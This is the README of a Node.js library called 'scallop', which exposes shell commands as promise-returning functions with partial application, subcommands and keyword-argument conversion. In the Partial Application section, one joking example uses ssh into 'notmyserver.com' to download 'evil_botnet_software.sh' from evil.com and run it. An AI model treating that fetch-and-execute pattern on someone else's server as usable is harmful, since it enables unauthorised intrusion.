<p align="center">
  <a href="https://github.com/bgw/scallop">
    <img src="https://raw.githubusercontent.com/bgw/scallop/master/logo.png"
         width="120px" alt="">
  </a>
</p>

<h1 align="center">Scallop</h1>

<p align="center">
  Shelling out with <code>child_process</code> is so&hellip; drab.
  <br>Relieve the tedium with <code>scallop</code>!
</p>

--------------------------------------------------------------------------------

```sh
$ npm i --save-dev scallop
```

```javascript
const scallop = require('scallop');
const curl = scallop('curl', {silent: true});

(async () => {
  const [out] = await curl('http://httpbin.org/user-agent');
  console.log(JSON.parse(out)['user-agent']); // curl/7.30.0
})():
// Of course this is a horribly contrived example. You should use `http.get`.
```

Now everything in `$PATH` has node bindings!

Literal Arguments
-----------------

Anything you pass directly to your wrapper function gets passed through.

```javascript
const mkdir = scallop('mkdir');
mkdir('example_directory');
```

Multiple arguments can be provided.

```javascript
mkdir('-p', 'parent/child');
```

Spaces and the like are automatically escaped.

```javascript
mkdir('Some directory with spaces! Wooo! Rebellion!');
```

Remember that, because this is node, everything is asynchronous, all our calls
will return immediately and execute in parallel. [Libraries like
`async`](https://github.com/caolan/async) or promises are good mechanisms for
organizing this mayhem.

### Argument Expansion

Because `Function.apply` is needlessly ugly, you can simply pass arrays beside
literal arguments.

```javascript
const myFolders = ['folderA', 'folderB', 'folderC'];
mkdir('-p', '-v', myFolders);
// which is the same as
mkdir.apply(null, ['-p', '-v'].concat(myFolders));
// or in ES2015
mkdir('-p', '-v', ...myFolders);
```

You can even have nested lists, and they'll all be expanded upon evaluation.

Partial Application
-------------------

You know, I kinda wish `mkdir` supplied `-p` by default.

```javascript
mkdir = mkdir.partial('-p');
mkdir('another-parent/child');
```

Oh! Look at that! It's okay I guess. I just wish it required **exactly one**
less function call. If only we could apply the partial when creating `mkdir`....

```javascript
const mkdir = scallop('mkdir', '-p');
```

Alright. That looks cool, but kinda limited in use.

```javascript
const ssh = scallop('ssh');
const definitelyMyServer = ssh.partial('notmyserver.com', '-p 1234');
const remoteCurl = definitelyMyServer.partial('curl', '--silent');

remoteCurl('-O', 'http://evil.com/evil_botnet_software.sh');
definitelyMyServer('sh', 'evil_botnet_software.sh');
// Please only use this on PHP websites
```

### Subcommands

Subcommands are a special case of partial application. `git` uses these heavily.
We can define some of the common subcommands for `git` with the
`defineSubcommands` function.

```javascript
const git = scallop('git').defineSubcommands('status', 'add', 'rm', 'clone');
git.clone('https://github.com/bgw/scallop.git', 'scallop');
```

A subcommand can be defined by a `--dashed-argument`, just pass it to
`defineSubcommands`, and the dashes will be stripped and converted to
`camelCase`.

Some programs might use a tree of these subcommands, which can be accomplished
by defining subcommands with and object. Arrays of subcommands can be
intermingled, forming leaves, or falsy values can be provided to prune the tree.

```javascript
const sudo = scallop('sudo');
sudo.defineSubcommands({ls: null, git: ['status', 'add', 'rm'], echo: null});
sudo.git.add('important_file.txt');
```

#### ES2015 Harmony Proxy Syntax

Having to make a call to `defineSubcommands` sucks, and there's no real reason
(except a lack of language support) why the subcommands should ever have to be
explicitly predefined.

The ES2015 adds [object Proxies][]. These allow us to intercept accesses to an
underlying object. If you enable proxies by passing `--harmony-proxies` or
`--harmony` to `node`, then you can use some alternate syntax. There's no
portable way to compile away or polyfill the Proxy API. Eventually this
language feature should be enabled by default in future versions of node.

[object Proxies]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy

```javascript
scallop.ssh['bgw@benjam.info'].git.rm('important_file.txt');
```

Take *that*, ES5!

Promises
--------

The output of commands is communicated using promises.

```javascript
const ls = scallop('ls', '-1');

ls('test_dir')
  .then(([stdout, stderr]) => {
    console.log(stdout.trim().split('\n'));
  })
  .catch((ex) => {
    console.trace(ex);
  });

// ['another_parent', 'example_directory', ... ]
```

This becomes more natural when paired with ES2016 async/await syntax.

```javascript
const [stdout, stderr] = await ls('test_dir');
console.log(stdout.trim().split('\n'));
```

Keyword Arguments
-----------------

As the last argument you may specify keyword arguments as an object. These
keyword arguments get rewritten as follows:

-   Single letter keys get a single dash prepended to them: `-s`
-   Multi-letter keys get two dashes prepended to them: `--long`
-   Integer values get converted to strings
-   Boolean values trigger some special casing (see below)
-   The value is appended after the key, separated by an equals sign:
    `--key=value`

### Boolean Keyword Arguments

It makes sense to think of the keyword arguments as an "options argument".
Fitting this analogy, keyword arguments with boolean values get processed
differently:

-   When true, the keyword gets one or two dashes prepended to it. No value is
    written out.
-   When false, the entire entry is ignored.

As an example, the object

```javascript
{verbose: false, escape: true, color: false, literal: true, a: true}
```

Would translate into

```
--escape --literal -a
```

### "Special" Keyword Arguments

Keys prepended with an _underscore act a bit differently. The following special
arguments are supported

-   `_cwd`: Current working directory
-   `_env`: An object of environment variables
-   `_uid`: The numerical ID or the string username of the user to execute as
-   `_gid`: The numerical ID or the string group of the user to execute as
-   `_encoding`: The encoding of stdout and stderr as a string. [Any encoding
    node supports][] can be passed. If given a falsy value, such as `null`, the
    stream will be treated as binary. Default is `utf8`.
-   `_okCodes`: An array of numbers representing valid exit codes. Defaults to
    `[0]`.

  [Any encoding node supports]: http://nodejs.org/api/stream.html#stream_readable_setencoding_encoding

Even More Stuff
---------------

I'm not done writing yet. But there's plenty more features in there, and many
ideas left to implement!

Portability
-----------

Because we're dealing with platform-specific commands, shelling out on Linux and
OS X will almost certainly be different than on Windows. Adding insult to
injury, I haven't even tested this on Windows. Oh well; it's not like Windows
has a significant market share.

See Also
--------

`scallop` is based on the python module, `sh` by Andrew Moffat. [`sh` is hosted
on GitHub.](http://amoffat.github.io/sh/) I even lifted some examples from his
documentation!
